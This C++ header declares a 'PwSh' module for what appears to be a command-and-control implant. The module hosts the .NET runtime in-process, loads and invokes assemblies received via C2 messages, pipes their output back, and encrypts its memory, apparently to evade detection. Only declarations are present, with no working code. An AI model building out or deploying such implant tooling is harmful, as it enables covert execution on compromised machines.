#pragma once

#include "ModuleCmd.hpp"
#include "Common.hpp"

#ifdef __linux__ 

#elif _WIN32

#include <windows.h>
#include <comdef.h>
#include <mscoree.h>
#include <metahost.h>

#include "HostControl.hpp"

// Import mscorlib.tlb (Microsoft Common Language Runtime Class Library).
#import "mscorlib.tlb" auto_rename raw_interfaces_only                \
    high_property_prefixes("_get","_put","_putref")                    \
    rename("ReportEvent", "InteropServices_ReportEvent")

#endif

#ifdef _WIN32
struct AssemblyModule
{
    mscorlib::_AssemblyPtr spAssembly;
    std::string name;
    std::string type;
};
#endif


class PwSh : public ModuleCmd
{

public:
    PwSh();
    ~PwSh();

    std::string getInfo();

    int init(std::vector<std::string>& splitedCmd, C2Message& c2Message);
    int process(C2Message& c2Message, C2Message& c2RetMessage);
    int errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg);
    int osCompatibility() 
    {
        return OS_WINDOWS;
    }

private:
    bool m_firstRun;

    int clearAssembly();
    int clearCLR();

#ifdef _WIN32

    bool m_memEcrypted;
    bool m_moduleLoaded;

    // initCLR
    ICLRMetaHost *m_pMetaHost;
    ICLRRuntimeInfo *m_pRuntimeInfo;
    ICLRRuntimeHost *m_pClrRuntimeHost;
    MyHostControl* m_pCustomHostControl;
    ICorRuntimeHost* m_pCorHost;
    IUnknownPtr m_spAppDomainThunk;

    // loadAssembly
    mscorlib::_AppDomainPtr m_spDefaultAppDomain;
    TargetAssembly* m_targetAssembly;
    
    int initCLR();
    int loadAssembly(const std::string& data, const std::string& type);
    int invokeMethodDll(const std::string& argument, std::string& result);
    int encryptMem();
    int decryptMem();

    std::vector<AssemblyModule> m_assemblies;

    mscorlib::_AssemblyPtr m_spAssembly;
    mscorlib::_TypePtr m_spType;
    variant_t m_vtInstance;

    HANDLE m_ioPipeRead;
    HANDLE m_ioPipeWrite;

#endif

};


#ifdef _WIN32

extern "C" __declspec(dllexport) PwSh * PwShConstructor();

#else

extern "C"  __attribute__((visibility("default"))) PwSh * PwShConstructor();

#endif

